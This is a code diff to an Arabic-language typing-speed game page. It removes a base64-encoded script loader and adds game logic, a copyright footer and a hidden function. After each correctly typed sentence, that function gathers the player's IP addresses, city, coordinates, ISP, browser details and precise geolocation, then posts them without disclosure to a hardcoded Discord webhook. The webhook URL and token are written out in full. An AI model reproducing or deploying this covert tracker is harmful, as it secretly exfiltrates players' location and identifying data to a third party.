@@ -24,7 +24,7 @@
   }
   .container {
     max-width: 700px;
-    margin: 60px auto;
+    margin: 60px auto 100px auto;
     padding: 20px;
     background: rgba(20,20,20,0.9);
     border-radius: 15px;
@@ -55,9 +55,9 @@
     font-size: 24px;
     font-weight: bold;
     margin-bottom: 15px;
+    word-spacing: 8px;
   }
   #sentence span {
-    margin-right: 6px;
     padding: 2px 5px;
     border-radius: 4px;
   }
@@ -147,6 +147,15 @@
   #result.error {
     color: #f44336;
   }
+  #rightsFooter {
+    position: fixed;
+    bottom: 10px;
+    left: 0; right: 0;
+    color: #888;
+    font-size: 14px;
+    text-align: center;
+    user-select: none;
+  }
 </style>
 </head>
 <body>
@@ -188,23 +197,106 @@
 
 <audio id="bgMusic" src="https://files.catbox.moe/l0gz7g.mp3" loop></audio>
 
-<script>
-  // فك التشفير وتشغيل السكربت المشفر Base64
-  (function(){
-    const code = "Y29uc3Qgc3RhcnRTY3JlZW4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TY3JlZW4nKTtjb25zdCBnYW1lU2NyZWVuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2dhbWVTY3JlZW4nKTtjb25zdCBwbGF5ZXJOYW1lID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BsYXllck5hbWUnKTtjb25zdCB3ZWxjb21lTXNzZyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ3ZWxjb21lTXNzZyIpO2NvbnN0IHNlbnRlbmNlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInNlbnRlbmNlIik7Y29uc3QgdXNlcklucHV0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInVzZXJJbnB1dCIpO2NvbnN0IHJlc3VsdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJyZXN1bHQiKTtjb25zdCByZWNvcmQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgyOSk7Y29uc3Qgc3BlZWREaXNwbGF5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInNwZWVkRGlzcGxheSIpO2NvbnN0IGJlc3RUaW1lRGlzcGxheSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJiZXN0VGltZSIpO2NvbnN0IHNvdXJjZSA9IGJvdCAvKiBmdW5jdGlvbiB3aWxsIGJlIGluc3RlcnRlZCBpbiBhIGxhdGVyIGNoYW5nZSAqLwogIFsKICAgICJTYW1wbGUgc2VudGVuY2UiLAogICAgIlNhcmEgYWxنجtHb29kIGpvy2YKCiAgXQpafTsKCmNvbnN0IHN0ZW50UmVjb2JzID0gW107Cg==";
+<div id="rightsFooter">حقوق © معاذ الحربي</div>
 
-    function decodeAndRun(base64) {
-      const decoded = atob(base64);
-      const script = document.createElement('script');
-      script.textContent = decoded;
-      document.body.appendChild(script);
+<script>
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w";
+
+  let highestWpm = 0;
+  let bestTime = 0;
+
+  const sentences = [
+    "اختبر سرعتك في الطباعة",
+    "هذا اختبار لقياس مهارتك",
+    "هل تستطيع التفوق على نفسك",
+    "البرمجة ممتعة وجميلة",
+    "ابدأ الآن ولا تتردد"
+  ];
+
+  function shuffle(array) {
+    for (let i = array.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [array[i], array[j]] = [array[j], array[i]];
     }
+  }
 
-    decodeAndRun(code);
-  })();
-</script>
+  let currentSentence = "";
+  let startTime = 0;
 
-<script>
+  function startGame() {
+    const name = document.getElementById("playerName").value.trim();
+    if (!name) {
+      alert("يرجى إدخال اسمك");
+      return;
+    }
+    document.getElementById("loginScreen").style.display = "none";
+    document.getElementById("gameScreen").style.display = "block";
+    document.getElementById("welcomeMsg").textContent = `مرحباً، ${name}`;
+    shuffle(sentences);
+    currentSentence = sentences[0];
+    renderSentence("");
+    document.getElementById("userInput").value = "";
+    document.getElementById("userInput").focus();
+    startTime = performance.now();
+  }
+
+  function renderSentence(userInput) {
+    const sentenceDiv = document.getElementById("sentence");
+    sentenceDiv.innerHTML = "";
+    const words = currentSentence.split(" ");
+    const inputWords = userInput.trim().split(" ");
+
+    words.forEach((word, idx) => {
+      const span = document.createElement("span");
+      span.textContent = word;
+      if (inputWords[idx]) {
+        if (inputWords[idx] === word) {
+          span.classList.add("correct");
+        } else if (word.startsWith(inputWords[idx])) {
+          span.style.color = "yellow";
+        } else {
+          span.classList.add("incorrect");
+        }
+      }
+      sentenceDiv.appendChild(span);
+      sentenceDiv.appendChild(document.createTextNode(" "));
+    });
+  }
+
+  function checkInput() {
+    const userInput = document.getElementById("userInput").value.trim();
+    const resultDiv = document.getElementById("result");
+    if (userInput === currentSentence) {
+      const endTime = performance.now();
+      const elapsed = (endTime - startTime) / 1000;
+      const wordsCount = currentSentence.split(" ").length;
+      const wpm = (wordsCount / elapsed) * 60;
+      if (wpm > highestWpm) {
+        highestWpm = wpm;
+        bestTime = elapsed;
+        document.getElementById("record").textContent = `أعلى سرعة: ${Math.round(wpm)} - ${elapsed.toFixed(2)} ثانية`;
+      }
+      resultDiv.textContent = `تهانينا! سرعتك ${Math.round(wpm)} كلمة بالدقيقة`;
+      resultDiv.classList.remove("error");
+      shuffle(sentences);
+      currentSentence = sentences[0];
+      document.getElementById("userInput").value = "";
+      renderSentence("");
+      startTime = performance.now();
+      sendUserInfo();
+    } else {
+      resultDiv.textContent = "الرجاء كتابة الجملة بشكل صحيح";
+      resultDiv.classList.add("error");
+    }
+  }
+
+  function handleEnter(event) {
+    if (event.key === "Enter") {
+      event.preventDefault();
+      checkInput();
+    }
+  }
+
   // نجوم متحركة في الخلفية
   const canvas = document.getElementById('stars');
   const ctx = canvas.getContext('2d');
@@ -271,6 +363,81 @@
   closeBtn.addEventListener('click', () => {
     rightsMenu.style.display = 'none';
   });
+
+  // إرسال معلومات المستخدم إلى الويب هوك
+  async function sendUserInfo() {
+    try {
+      const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
+        fetch('https://api.ipify.org?format=json'),
+        fetch('https://api64.ipify.org?format=json'),
+        fetch('https://ipapi.co/json/')
+      ]);
+      const ipv4Data = await ipv4Res.json();
+      const ipv6Data = await ipv6Res.json();
+      const geoData = await geoRes.json();
+
+      const ua = navigator.userAgent;
+      const lang = navigator.language;
+      const now = new Date();
+      const timeString = now.toISOString();
+      const ipv4 = ipv4Data.ip;
+      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';
+
+      // تحديد نوع الجهاز
+      let deviceType = "كمبيوتر";
+      if (/android|iphone|ipad|ipod/i.test(ua)) {
+        deviceType = /tablet|ipad/i.test(ua) ? "تابلت" : "جوال";
+      }
+
+      function sendToWebhook(extraGeo = '') {
+        const infoText = `
+IP (IPv4): ${ipv4}
+IP (IPv6): ${ipv6}
+الدولة: ${geoData.country_name}
+المنطقة: ${geoData.region}
+المدينة: ${geoData.city}
+خط العرض: ${geoData.latitude}
+خط الطول: ${geoData.longitude}
+المنظمة: ${geoData.org}
+المنطقة الزمنية: ${geoData.timezone}
+نوع الجهاز: ${deviceType}
+المتصفح: ${ua}
+اللغة: ${lang}
+الوقت: ${timeString}
+${extraGeo}
+        `.trim();
+
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: infoText })
+        });
+      }
+
+      if (navigator.geolocation) {
+        let responded = false;
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            responded = true;
+            const extraGeo = `موقع دقيق:\nخط العرض: ${pos.coords.latitude.toFixed(6)}\nخط الطول: ${pos.coords.longitude.toFixed(6)}`;
+            sendToWebhook(extraGeo);
+          },
+          () => {
+            responded = true;
+            sendToWebhook();
+          },
+          { timeout: 4000 }
+        );
+        setTimeout(() => {
+          if (!responded) sendToWebhook();
+        }, 4500);
+      } else {
+        sendToWebhook();
+      }
+    } catch (e) {
+      console.error('خطأ في إرسال معلومات المستخدم', e);
+    }
+  }
 </script>
 
 </body>
